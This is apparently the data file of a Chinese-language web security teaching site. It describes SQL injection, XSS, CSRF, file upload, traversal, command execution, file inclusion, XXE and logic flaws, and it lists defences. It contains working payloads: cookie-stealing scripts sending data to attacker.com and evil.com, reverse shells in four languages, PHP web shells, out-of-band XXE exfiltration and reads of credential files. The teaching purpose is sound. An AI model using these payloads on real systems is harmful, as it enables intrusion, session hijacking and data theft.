import {
  faCode,
  faPaperPlane,
  faUpload,
  faDownload,
  faTerminal,
  faFile,
  faFileCode,
  faExchangeAlt,
  faServer,
  faPuzzlePiece,
  faLayerGroup,
  faGlobe,
  faHdd,
  faKey,
  faUserShield,
  faShieldAlt,
  faCloud,
  faBug,
  faNetworkWired,
  faFingerprint,
  faLock,
  faUserSecret,
  faSearch,
  faCodeBranch,
  faArchive,
} from '@fortawesome/free-solid-svg-icons';

const TEMPLATE_EXPRESSION_PREFIX = ['$', '{'].join('');
const ESCAPED_TEMPLATE_EXPRESSION_PREFIX = '\\' + TEMPLATE_EXPRESSION_PREFIX;
const createKnowledgeCategory = ({
  title,
  icon,
  description,
  sections,
  protection,
}) => ({
  title,
  icon,
  description,
  sections: sections.map(section => ({
    difficulty: 'intermediate',
    ...section,
  })),
  protection,
});

const knowledgeData = {
  'sql-injection': {
    title: 'SQL注入漏洞',
    icon: faCode,
    description: 'SQL注入是一种常见的网络安全漏洞，攻击者通过在输入字段中插入恶意SQL代码，来操纵数据库执行非预期的命令。',
    sections: [
      {
        title: '字符型SQL注入',
        content: '字符型SQL注入是指在字符串参数中进行注入，通常需要闭合引号。例如在 username=\'admin\' 的查询中，可以输入 admin\' OR \'1\'=\'1 来绕过登录验证。',
        examples: [
          "admin' OR '1'='1",
          "admin' --",
          "admin' OR 1=1 #"
        ],
        difficulty: 'beginner'
      },
      {
        title: '数值型SQL注入',
        content: '数值型SQL注入是在数字参数中进行的注入，不需要引号闭合。例如在 id=1 的查询中，可以输入 1 OR 1=1 来返回所有记录。',
        examples: [
          "1 OR 1=1",
          "1 AND 1=0 UNION SELECT 1,2,3,4",
          "1; SELECT * FROM users"
        ],
        difficulty: 'beginner'
      },
      {
        title: '联合注入',
        content: 'UNION注入利用SQL的UNION运算符合并两个SELECT语句的结果，用于从其他表获取数据。需要知道表的列数并确保类型匹配。',
        examples: [
          "1' UNION SELECT 1,2,3,4,5 --",
          "1' UNION SELECT null,null,username,password,null FROM users --"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '报错注入',
        content: '报错注入利用数据库的错误消息来提取信息。通过构造能触发错误但同时在错误消息中包含查询结果的SQL语句。',
        examples: [
          "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
          "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --"
        ],
        difficulty: 'advanced'
      },
      {
        title: '布尔盲注',
        content: '布尔盲注在无法直接获取查询结果时使用，通过观察应用的真/假响应来推断信息。每次只能提取一位信息。',
        examples: [
          "1' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1))>90 --",
          "1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a' --"
        ],
        difficulty: 'advanced'
      },
      {
        title: '时间盲注',
        content: '时间盲注是另一种盲注技术，使用数据库的时间延迟函数。如果条件为真，查询会延迟执行，攻击者通过响应时间来推断结果。',
        examples: [
          "1' AND IF(ASCII(SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1))>90, SLEEP(5), 0) --",
          "1'; SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users; --"
        ],
        difficulty: 'expert'
      },
      {
        title: '二阶注入',
        content: '二阶注入是一种高级技术，攻击者首先将恶意输入存储在数据库中，然后在应用程序的另一个部分触发该输入被使用，造成注入。',
        examples: [
          "注册用户名: admin'-- 后登录并修改密码",
          "在个人资料中存储 '); DROP TABLE users; --"
        ],
        difficulty: 'expert'
      },
      {
        title: '绕过技术',
        content: '绕过技术用于规避应用程序的安全过滤。包括使用编码、注释、等效函数替换和空格替代等方法。',
        examples: [
          "空格替代: 1'/**/OR/**/1=1--",
          "大小写混合: UnIoN SeLeCt 1,2,3",
          "编码绕过: admin%27 OR 1=1",
          "注释嵌套: /*!50000 UNION*/ SELECT 1,2,3"
        ],
        difficulty: 'expert'
      }
    ],
    protection: [
      '所有值参数使用参数化查询，字段名与排序方向使用白名单映射',
      '对数值、枚举和长度实施服务端类型校验，输入过滤不能替代参数化查询',
      '数据库账号按业务查询范围授权，禁用不必要的 DDL、DCL 和跨库权限',
      '对外返回统一错误信息，SQL 与驱动细节仅写入受控服务端日志'
    ]
  },
  'xss': {
    title: '跨站脚本漏洞',
    icon: faCode,
    description: '跨站脚本(XSS)是一种注入攻击，攻击者在网页中注入恶意客户端代码。当用户浏览受影响的页面时，恶意脚本会执行，可能窃取信息或执行未授权操作。',
    sections: [
      {
        title: '反射型跨站脚本',
        content: '反射型XSS是最常见的类型，恶意代码从请求中"反射"到响应中。通常通过URL参数、表单提交或其他HTTP请求方式触发。',
        examples: [
          "<script>alert('XSS')</script>",
          "<img src=x onerror=alert('XSS')>",
          "<svg onload=alert('XSS')>"
        ],
        difficulty: 'beginner'
      },
      {
        title: '存储型跨站脚本',
        content: '存储型XSS是最危险的类型，恶意代码被永久存储在目标服务器上（如数据库）。当用户请求存储数据的页面时，恶意代码被执行。',
        examples: [
          "在评论框中: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
          "在个人资料中: <img src=x onerror=fetch('https://evil.com?cookie='+btoa(document.cookie))>"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'DOM型跨站脚本',
        content: 'DOM型XSS不涉及服务器，而是攻击发生在客户端，恶意代码通过修改页面DOM环境触发。通常利用JavaScript动态操作DOM的页面。',
        examples: [
          "location.hash操作: https://example.com/page#<img src=x onerror=alert(1)>",
          "eval()执行: ?input=alert(1)"
        ],
        difficulty: 'advanced'
      },
      {
        title: '利用XSS平台获取Cookie',
        content: 'XSS攻击常用于窃取用户Cookie，攻击者可以利用这些Cookie劫持用户会话。专业的XSS平台可以自动化这一过程。',
        examples: [
          "<script>new Image().src='https://attacker.com/steal.php?cookie='+encodeURIComponent(document.cookie);</script>",
          "<script>fetch('https://evil.com/collect?data='+btoa(document.cookie))</script>"
        ],
        difficulty: 'intermediate'
      }
    ],
    protection: [
      '对输出进行HTML转义',
      '使用内容安全策略(CSP)',
      '实施输入验证',
      '使用HttpOnly和Secure标志保护Cookie',
      '使用现代框架的内置XSS保护'
    ]
  },
  'csrf': {
    title: '跨站请求伪造漏洞',
    icon: faPaperPlane,
    description: '跨站请求伪造(CSRF)是一种攻击，迫使用户在已认证的Web应用程序上执行非本意操作。攻击者诱导用户访问恶意网站，利用用户的身份向目标站点发起请求。',
    sections: [
      {
        title: 'GET型CSRF',
        content: 'GET型CSRF利用简单的GET请求进行攻击，这通常用于不需要太多数据的操作，如更改账户设置、关注用户等。利用图片标签或iframe可轻松触发。',
        examples: [
          "<img src='https://bank.example/transfer?to=attacker&amount=1000'>",
          "<iframe src='https://forum.example/delete-post?id=123' style='display:none'></iframe>"
        ],
        difficulty: 'beginner'
      },
      {
        title: 'POST型CSRF',
        content: 'POST型CSRF攻击更加复杂，因为需要构造一个表单并自动提交。这通常用于更敏感的操作，如密码更改、资金转账等。需要JavaScript自动提交表单。',
        code:
"<form id='csrf-form' action='https://bank.example/transfer' method='POST'>\n  <input type='hidden' name='to' value='attacker'>\n  <input type='hidden' name='amount' value='1000'>\n</form>\n<script>document.getElementById('csrf-form').submit();</script>"
      },
      {
        title: 'CSRF Token窃取',
        content: 'CSRF Token是一种防御CSRF攻击的常见方法，但在某些情况下，攻击者可以窃取这些Token并绕过防护。Token窃取通常依赖于XSS漏洞或其他信息泄露来获取有效Token，然后在CSRF攻击中使用。',
        code:
"// 通过XSS窃取CSRF Token\nlet token = document.querySelector('input[name=csrf_token]').value;\n\n// 将Token发送到攻击者控制的服务器\nfetch('https://attacker.com/collect?token=' + token);\n\n// 之后使用窃取的Token构造CSRF攻击\n<form action=\"https://victim.com/action\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"STOLEN_TOKEN\">\n  <input type=\"hidden\" name=\"action\" value=\"malicious_action\">\n</form>"
      }
    ],
    protection: [
      '使用CSRF令牌（一次性随机令牌）',
      '验证HTTP Referer头（作为辅助措施）',
      '使用SameSite Cookie属性',
      '要求用户重新验证敏感操作',
      '使用自定义请求头（如X-Requested-With）'
    ]
  },
  'file-upload': {
    title: '任意文件上传漏洞',
    icon: faUpload,
    description: '任意文件上传漏洞允许攻击者将恶意文件上传到服务器，这可能导致远程代码执行、服务器接管或网页篡改。攻击者通常会尝试绕过文件类型和内容限制。',
    sections: [
      {
        title: 'JavaScript校验绕过',
        content: 'JavaScript校验是最简单的文件上传限制，通常在客户端实现。由于客户端验证可以被轻易绕过（通过禁用JavaScript、修改前端代码或使用拦截代理），这种保护措施是不可靠的。',
        examples: [
          "使用浏览器开发工具移除验证脚本",
          "使用Burp Suite等代理拦截和修改请求",
          "修改HTML表单的accept属性: <input type=\"file\" accept=\".jpg,.png\" /> 改为接受所有文件"
        ],
        difficulty: 'beginner'
      },
      {
        title: 'MIME类型检测绕过',
        content: '许多应用程序通过检查Content-Type头来验证文件类型。攻击者可以将恶意文件的MIME类型修改为允许的类型（如image/jpeg），从而绕过这种保护。',
        examples: [
          "在Burp Suite中修改Content-Type: application/x-php 改为 image/jpeg",
          "使用双扩展名: shell.php.jpg (某些系统仅检查最后一个扩展名)",
          "在有效的图像文件中嵌入PHP代码（图像外壳）"
        ],
        difficulty: 'beginner'
      },
      {
        title: '扩展名校验绕过',
        content: '服务器端可能会检查文件扩展名以确保安全。攻击者可以尝试使用各种技术绕过这些检查，例如使用替代扩展名、大小写混合或特殊字符。',
        examples: [
          "使用不常见的扩展名: shell.phtml, shell.php5, shell.shtml",
          "使用大小写混合: shell.pHP, shell.Php",
          "使用空字节注入（在旧版本系统中）: shell.php%00.jpg"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '文件内容检测绕过',
        content: '更高级的防护措施会检查文件内容（如魔术字节）以确认文件类型。攻击者可以通过在恶意文件开头添加有效的文件签名来欺骗这种检测。',
        examples: [
          "添加JPEG文件头: FF D8 FF E0 00 10 4A 46 49 46 00 01 [PHP代码]",
          "使用多部分文件（如GIF+PHP）: GIF89a<?php system($_GET['cmd']); ?>",
          "使用注释隐藏代码: <!--<?php system($_GET['cmd']); ?>-->"
        ],
        difficulty: 'advanced'
      },
      {
        title: '二次渲染绕过',
        content: '某些系统会对上传的图像进行处理或渲染，这可能会删除嵌入的恶意代码。但在特定情况下，攻击者可以构造在处理后仍保留恶意部分的文件。',
        examples: [
          "利用图像处理库的漏洞嵌入代码",
          "使用元数据字段（如EXIF）注入PHP代码",
          "构造处理后会产生有效恶意代码的复杂多层文件"
        ],
        difficulty: 'expert'
      },
      {
        title: '条件竞争绕过',
        content: '条件竞争攻击利用上传文件处理的时间差。某些系统可能先接受文件，执行初步验证，然后再进行深入检查或移动文件。攻击者可以在这个时间窗口内访问文件。',
        examples: [
          "上传恶意文件后立即发送多个请求尝试执行它",
          "利用文件处理时序，在验证完成前就访问临时上传位置",
          "自动化脚本持续请求潜在的临时文件路径"
        ],
        difficulty: 'expert'
      }
    ],
    protection: [
      '实施严格的服务器端文件类型验证',
      '使用白名单而非黑名单进行扩展名过滤',
      '验证文件内容而非仅依赖扩展名或MIME类型',
      '使用随机文件名存储上传文件，并记录原始名称在数据库中',
      '将上传的文件存储在无法直接访问的目录或外部存储服务中',
      '对上传的文件应用内容处理（如图像重采样）',
      '使用适当的文件权限（不可执行）'
    ]
  },
  'file-download': {
    title: '任意文件下载漏洞',
    icon: faDownload,
    description: '任意文件下载漏洞（也称为路径遍历或目录遍历）允许攻击者访问和下载服务器上的敏感文件，这些文件通常位于Web根目录之外。这可能导致源代码、配置文件或系统文件泄露。',
    sections: [
      {
        title: '路径遍历',
        content: '路径遍历（也称为目录遍历）是利用未经适当验证的文件路径参数，使攻击者能够访问预期目录之外的文件。通常使用"../"序列来向上导航目录结构。',
        examples: [
          "/?file=../../../etc/passwd",
          "/?document=../../../var/www/html/config.php",
          "/?log=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ],
        difficulty: 'beginner'
      },
      {
        title: '未授权文件任意下载',
        content: '未授权文件下载发生在应用程序允许用户下载文件但没有适当的访问控制检查。攻击者可以通过修改请求参数来访问他们无权查看的文件，例如其他用户的私人文档。',
        examples: [
          "/?download=user_private_doc.pdf 改为 /?download=admin_financial_report.pdf",
          "修改用户ID参数: /files/download?user_id=123&file_id=456 改为 /files/download?user_id=999&file_id=789",
          "直接访问文件存储路径: /uploads/users/admin/secret.txt"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '敏感文件获取',
        content: '敏感文件获取是指通过文件下载漏洞针对性地获取系统中的敏感信息，如配置文件、密钥、数据库凭据等。攻击者通常会根据目标系统的类型和架构寻找特定文件。',
        examples: [
          "常见配置文件: /etc/passwd, /etc/shadow, /proc/self/environ",
          "Web应用配置: /var/www/html/config.php, /app/config/database.yml",
          "源代码获取: /var/www/html/index.php, /app/controllers/UserController.php",
          "日志文件: /var/log/apache2/access.log, /var/log/nginx/error.log",
          "SSH密钥: /home/user/.ssh/id_rsa, /root/.ssh/authorized_keys"
        ],
        difficulty: 'advanced'
      },
      {
        title: '绕过路径限制',
        content: '当开发者尝试通过过滤或验证文件路径来防止攻击时，攻击者可能会使用各种技术来绕过这些限制，包括编码、过滤器绕过和攻击式的文件路径构造。',
        examples: [
          "使用URL编码: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
          "双重编码: %252e%252e%252f%252e%252e%252fetc%252fpasswd",
          "使用不同的路径分隔符: ..\\..\\etc\\passwd",
          "嵌套遍历序列: ....//....//etc/passwd",
          "空字节截断(旧版本): /../../../etc/passwd%00.png"
        ],
        difficulty: 'expert'
      }
    ],
    protection: [
      '避免将用户输入直接用于文件系统操作',
      '实现白名单而非黑名单的文件访问控制',
      '使用安全的文件访问APIs，如PHP的basename()函数',
      '规范化文件路径并验证它们在允许的目录内',
      '使用间接引用（如数据库ID而非文件路径）',
      '设置适当的文件系统权限',
      '使用Web服务器的沙盒机制（如chroot）'
    ]
  },
  'command-execution': {
    title: '命令/代码执行漏洞',
    icon: faTerminal,
    description: '命令执行漏洞允许攻击者在目标服务器上执行操作系统命令或代码，这可能导致完全控制系统、数据泄露或服务破坏。这类漏洞通常出现在将用户输入传递给系统命令的应用程序中。',
    sections: [
      {
        title: 'PHP命令执行',
        content: 'PHP命令执行漏洞发生在应用程序使用用户输入作为系统命令参数但未正确过滤时。攻击者可以通过插入特殊字符和命令分隔符执行任意PHP代码或系统命令。',
        examples: [
          "system()函数: system('ping ' . $_GET['host']);",
          "执行运算符: echo `ping $_GET['host']`;",
          "shell_exec()函数: $output = shell_exec('ls ' . $_GET['dir']);",
          "eval()函数: eval('echo ' . $_POST['code'] . ';');"
        ],
        difficulty: 'beginner'
      },
      {
        title: 'Java命令执行',
        content: 'Java命令执行漏洞允许攻击者在Java应用程序中执行任意代码或系统命令。这通常通过不安全的反序列化、JNDI注入或对运行时环境的不安全访问实现。',
        examples: [
          "Runtime执行: Runtime.getRuntime().exec(\"ping \" + userInput);",
          "ProcessBuilder: new ProcessBuilder(\"sh\", \"-c\", \"ping \" + userInput).start();",
          "不安全的JNDI查找: context.lookup(\"ldap://attacker.com/exploit\");",
          "不安全的反序列化: ObjectInputStream ois = new ObjectInputStream(input); Object obj = ois.readObject();"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'Python模板注入',
        content: 'Python模板注入（SSTI）是一种通过操作模板引擎的语法实现代码执行的漏洞。当用户输入被直接插入到模板中而不进行适当的净化时，攻击者可以注入并执行Python代码。',
        examples: [
          "Flask/Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
          "Django: {% debug %} 或 {% include request.GET.template_name %}",
          "Mako: <%import os>" + TEMPLATE_EXPRESSION_PREFIX + "os.popen('id').read()}",
          "Tornado: {% import os %}{{os.popen('id').read()}}"
        ],
        difficulty: 'advanced'
      },
      {
        title: '反弹shell',
        content: '反弹shell是一种攻击技术，使目标服务器主动连接到攻击者的计算机，并提供命令shell。这对于绕过防火墙和网络隔离特别有用，因为连接是从内部发起的。',
        examples: [
          "Bash反弹shell: bash -i >& /dev/tcp/attacker.com/4444 0>&1",
          "Python反弹shell: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
          "Perl反弹shell: perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
          "PHP反弹shell: php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ],
        difficulty: 'expert'
      }
    ],
    protection: [
      '避免直接使用用户输入执行系统命令',
      '使用参数化API代替字符串拼接',
      '实施严格的输入验证和白名单',
      '限制应用程序运行权限（最小权限原则）',
      '使用Web应用防火墙拦截恶意请求',
      '实施网络分段和出站流量限制',
      '定期审计和扫描代码中的潜在命令注入点'
    ]
  },
  'file-inclusion': {
    title: '文件包含漏洞',
    icon: faFile,
    description: '文件包含漏洞允许攻击者包含未经授权的文件作为网页的一部分，这可能导致敏感信息泄露、代码执行或完全服务器接管。这类漏洞分为本地文件包含(LFI)和远程文件包含(RFI)。',
    sections: [
      {
        title: '基础文件包含',
        content: '文件包含漏洞存在于动态包含文件的应用程序中，特别是当文件路径由用户输入控制时。攻击者可以修改此参数以包含任意文件，包括敏感系统文件或恶意代码。',
        examples: [
          "本地文件包含(LFI): ?page=../../../etc/passwd",
          "远程文件包含(RFI): ?page=http://evil.com/shell.php",
          "使用PHP封装器: ?page=php://filter/convert.base64-encode/resource=index.php",
          "引入日志文件: ?page=../../../var/log/apache2/access.log"
        ],
        difficulty: 'beginner'
      },
      {
        title: '敏感文件读取',
        content: '使用文件包含漏洞，攻击者可以读取服务器上的敏感文件，包括配置文件、源代码、密码文件和其他敏感信息，即使这些文件位于Web根目录之外。',
        examples: [
          "读取系统文件: ?page=../../../etc/shadow",
          "读取配置文件: ?page=../../../var/www/html/config.php",
          "读取数据库凭据: ?page=../../../wp-config.php",
          "读取SSH密钥: ?page=../../../home/user/.ssh/id_rsa"
        ],
        difficulty: 'beginner'
      },
      {
        title: '日志文件包含',
        content: '日志文件包含是一种高级技术，攻击者首先在服务器日志中注入恶意代码（如通过操作User-Agent头），然后通过文件包含漏洞包含该日志文件，触发恶意代码执行。',
        examples: [
          "1. 注入恶意代码到User-Agent: <?php system($_GET['cmd']); ?>",
          "2. 包含访问日志: ?page=../../../var/log/apache2/access.log",
          "3. 执行注入的代码: ?page=../../../var/log/apache2/access.log&cmd=whoami",
          "其他常见日志: /var/log/mail.log, /var/log/auth.log, /var/log/sshd.log"
        ],
        difficulty: 'advanced'
      },
      {
        title: 'SESSION文件包含',
        content: 'SESSION文件包含利用PHP会话文件存储机制。攻击者先将恶意代码存储在自己的会话变量中，然后通过文件包含漏洞包含该会话文件，触发代码执行。',
        examples: [
          "1. 在会话中存储恶意代码: <?php $_SESSION['data']='<?php system($_GET[\"cmd\"]); ?>'; ?>",
          "2. 包含会话文件: ?page=../../../var/lib/php/sessions/sess_[SESSION_ID]",
          "3. 执行注入的代码: ?page=../../../var/lib/php/sessions/sess_[SESSION_ID]&cmd=whoami",
          "常见会话文件位置: /tmp/sess_*, /var/lib/php/sessions/sess_*"
        ],
        difficulty: 'advanced'
      },
      {
        title: '伪协议实现文件读取和代码执行',
        content: '在PHP等语言中，可以使用特殊的伪协议封装器来利用文件包含漏洞执行更复杂的攻击，包括读取源代码、执行代码或绕过特定限制。',
        examples: [
          "读取源码: ?page=php://filter/convert.base64-encode/resource=index.php",
          "代码执行: ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B&cmd=whoami",
          "使用ZIP封装器: ?page=zip://uploads/malicious.zip#shell.php",
          "使用expect封装器执行命令: ?page=expect://ls"
        ],
        difficulty: 'advanced'
      },
      {
        title: '任意目录遍历',
        content: '目录遍历允许攻击者访问预期目录之外的文件。在文件包含漏洞中，这通常用于访问系统文件或跨应用程序边界读取文件。',
        examples: [
          "基本目录遍历: ?page=../../../../etc/passwd",
          "使用路径规范化绕过过滤: ?page=....//....//....//....//etc/passwd",
          "使用不同路径分隔符: ?page=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
          "使用父目录超出根目录: ?page=/var/www/../../etc/passwd"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '00截断绕过',
        content: '在某些版本的PHP和其他语言中，空字节(%00)可以用于截断字符串。攻击者可以利用这一点绕过文件扩展名检查或其他安全措施，特别是在文件包含场景中。',
        examples: [
          "截断文件扩展名: ?page=../../../etc/passwd%00.php",
          "截断附加路径: ?page=../../../etc/passwd%00/harmless/path",
          "URL编码空字节: ?page=../../../etc/passwd%2500.php",
          "注意：此漏洞在PHP 5.3.4及更高版本中已修复"
        ],
        difficulty: 'advanced'
      }
    ],
    protection: [
      '避免基于用户输入包含文件',
      '使用预定义的白名单文件映射',
      '禁用不必要的PHP封装器（如expect, data）',
      '启用open_basedir限制',
      '禁用远程文件包含（allow_url_include=Off）',
      '实施严格的输入验证和规范化',
      '使用Web应用防火墙拦截恶意请求',
      '遵循最小权限原则配置Web服务器'
    ]
  },
  'xxe': {
    title: 'XML外部实体注入漏洞',
    icon: faFileCode,
    description: 'XML外部实体注入(XXE)是一种针对处理XML输入的应用程序的攻击，通过利用XML解析器处理外部实体引用的特性，可能导致敏感数据泄露、服务器端请求伪造、服务器探测或拒绝服务。',
    sections: [
      {
        title: '有回显的XXE',
        content: '有回显的XXE是指攻击者能够在应用程序响应中直接看到所检索文件的内容。这是最直接的XXE攻击形式，因为攻击结果立即可见。',
        examples: [
          "读取系统文件:\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>",
          "读取源代码:\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"file:///var/www/html/config.php\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>",
          "列出目录内容:\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"file:///var/www/html/\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '无回显的XXE',
        content: '无回显的XXE发生在应用程序处理外部实体但不在响应中显示其内容时。攻击者需要使用替代技术来提取数据，如带外数据通道(OOB)或错误消息。',
        examples: [
          "使用带外通道(HTTP):\n<!DOCTYPE test [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">\n  %dtd;\n]>\n<root>Test</root>\n\n# evil.dtd内容:\n<!ENTITY % all \"<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>\">\n%all;\n%send;",
          "使用带外通道(DNS):\n<!DOCTYPE test [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % eval \"<!ENTITY exfil SYSTEM 'http://%file;.attacker.com/x'>\">\n  %eval;\n  %exfil;\n]>\n<root>Test</root>",
          "利用错误消息:\n<!DOCTYPE test [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % eval \"<!ENTITY error SYSTEM 'file:///nonexistent/%file;'>\">\n  %eval;\n  %error;\n]>\n<root>Test</root>"
        ],
        difficulty: 'advanced'
      }
    ],
    protection: [
      '在XML解析器中禁用外部实体和DTD处理',
      '使用安全配置的XML解析器，如JAXP DocumentBuilderFactory的setFeature方法',
      '对用户提供的XML内容进行输入验证和过滤',
      '使用简单数据格式如JSON替代XML（如可能）',
      '实施数据输入的白名单验证',
      '使用XSD验证输入的XML文档',
      '定期更新XML处理库到最新版本'
    ]
  },
  'logic-vulnerabilities': {
    title: '业务逻辑漏洞',
    icon: faExchangeAlt,
    description: '业务逻辑漏洞存在于应用程序流程和功能的实现中，这类漏洞不是由于技术缺陷，而是由于设计或实现过程中的逻辑错误。它们往往与特定应用程序的业务规则密切相关，因此很难通过自动化工具发现。',
    sections: [
      {
        title: '用户名遍历',
        content: '用户名遍历漏洞允许攻击者确认特定用户名是否存在于系统中。当应用程序对有效和无效用户名响应不同时，攻击者可以收集有效账户列表，为进一步攻击提供基础。',
        examples: [
          "错误信息差异: 提示\"用户名不存在\"与\"密码错误\"",
          "响应时间差异: 验证有效用户名比无效用户名需要更长时间",
          "恢复密码功能: \"该电子邮件未注册\"与\"已发送重置链接\"",
          "批量账户探测: 自动化脚本测试常见用户名列表"
        ],
        difficulty: 'beginner'
      },
      {
        title: '重放攻击',
        content: '重放攻击是指攻击者捕获和重复使用有效的用户请求或数据传输，以欺骗系统执行重复操作或跳过身份验证步骤。这种攻击通常涉及会话令牌、认证凭证或交易数据的重用。',
        examples: [
          "认证令牌重用: 捕获并重复使用过期的访问令牌",
          "交易重放: 重复支付请求多次提取资金",
          "会话固定: 使用预先获取的会话ID强制用户使用已知会话",
          "OTP绕过: 重用一次性密码或验证码"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '验证码复用',
        content: '验证码复用漏洞存在于验证码实现不当的系统中，使攻击者能够使用已知的验证码回答多次，或在不同上下文中重用同一验证码。这通常源于验证码状态跟踪不足或验证码生命周期管理不当。',
        examples: [
          "验证码会话不关联: 同一验证码对所有用户有效",
          "验证码不失效: 使用过的验证码仍然有效",
          "验证码序列可预测: 基于时间或简单算法生成的验证码",
          "验证码跨功能有效: 在一个功能生成的验证码用于另一个功能"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '支付逻辑',
        content: '支付逻辑漏洞存在于处理金融交易的系统中，允许攻击者操纵订单处理、支付金额或绕过支付步骤。这些漏洞可能导致经济损失、服务免费使用或欺诈交易。',
        examples: [
          "价格操纵: 在客户端修改产品价格或数量",
          "货币套利: 在货币转换过程中利用舍入错误",
          "竞争条件: 在支付前获取产品/服务",
          "负数金额: 使用负值导致退款或账户增值",
          "优惠券滥用: 多次使用一次性优惠券或组合使用不兼容优惠"
        ],
        difficulty: 'advanced'
      },
      {
        title: '水平越权',
        content: '水平越权漏洞允许用户访问或修改属于同级别其他用户的资源。这通常发生在应用程序验证用户已认证，但未验证用户是否有权访问特定资源时。',
        examples: [
          "直接对象引用: 修改URL参数访问其他用户的资料 (/profile?id=123 改为 /profile?id=456)",
          "API端点保护不足: 使用有效令牌访问他人资源 (/api/documents/user_id/456)",
          "功能级授权缺失: 拥有查看自身记录权限但可修改他人记录",
          "批量导出: 使用批量功能越权获取多用户数据"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '垂直越权',
        content: '垂直越权漏洞允许用户执行高于其权限级别的操作，本质上是特权提升攻击。这发生在应用程序未正确检查用户权限或角色时。',
        examples: [
          "管理功能访问: 普通用户访问管理控制面板 (/admin/users)",
          "功能强制: 普通用户执行管理操作 (DELETE /api/users/123)",
          "隐藏功能: 访问界面中不可见但后端存在的高权限功能",
          "参数篡改: 修改权限相关参数 (role=user 改为 role=admin)"
        ],
        difficulty: 'advanced'
      },
      {
        title: '未授权访问',
        content: '未授权访问漏洞允许未经身份验证的用户访问受保护资源或执行需要认证的操作。这通常发生在应用程序仅在某些入口点强制认证，但忽略了其他访问路径的问题。',
        examples: [
          "直接URL访问: 绕过认证页面直接访问内部页面 (/dashboard)",
          "API端点缺乏认证: 未保护的API端点 (/api/user/data)",
          "预认证页面访问控制不足: 访问旨在认证后使用的功能",
          "备用入口点: 通过替代URL路径或不同域访问相同资源"
        ],
        difficulty: 'beginner'
      },
      {
        title: '登录认证绕过',
        content: '登录认证绕过漏洞允许攻击者在不提供有效凭据的情况下获得系统访问权限。这些漏洞利用身份验证机制的实现缺陷，从而绕过整个认证过程。',
        examples: [
          "默认或后门凭据: 使用开发者留下的默认账户",
          "身份验证缺陷: SQL注入、弱加密或条件逻辑错误",
          "多因素认证绕过: 跳过MFA步骤或重用令牌",
          "会话固定/劫持: 使用预先获取的会话ID",
          "认证状态操纵: 修改cookie或localStorage中的认证标志"
        ],
        difficulty: 'advanced'
      },
      {
        title: '密码重置',
        content: '密码重置漏洞存在于密码恢复和重置机制中，允许攻击者重置受害者的密码并接管其账户。这通常利用令牌验证、用户标识或通知传递中的逻辑缺陷。',
        examples: [
          "重置令牌可预测: 使用简单序列或时间戳生成的令牌",
          "令牌未绑定用户: 同一令牌可用于重置任何用户密码",
          "令牌未过期: 长期有效的重置链接",
          "账户枚举: 重置流程泄露用户存在信息",
          "重置问题弱: 容易推测或社会工程获取的安全问题"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '空口令',
        content: '空口令漏洞允许用户使用空白或缺失的密码进行认证。这种漏洞源于认证系统中的逻辑错误，尤其是在处理空密码字符串、缺少必要验证或默认凭据未更改时。',
        examples: [
          "空密码接受: 系统接受空白密码字段",
          "默认空密码: 新用户账户或重置后的默认状态",
          "认证逻辑缺陷: 密码验证被跳过的条件路径",
          "API端点不验证: 直接API调用接受空密码",
          "密码字段处理错误: 空格或特殊字符处理不当"
        ],
        difficulty: 'beginner'
      }
    ],
    protection: [
      '实施请求速率限制，防止枚举和暴力攻击',
      '采用一致的错误信息，避免信息泄露',
      '对所有敏感操作实施授权检查',
      '验证所有客户端传入参数，包括隐藏字段',
      '使用交易令牌防止重放和CSRF',
      '审核业务流程的所有步骤和条件',
      '实施验证码和其他人工检查机制',
      '采用基于角色的访问控制(RBAC)和最小权限原则',
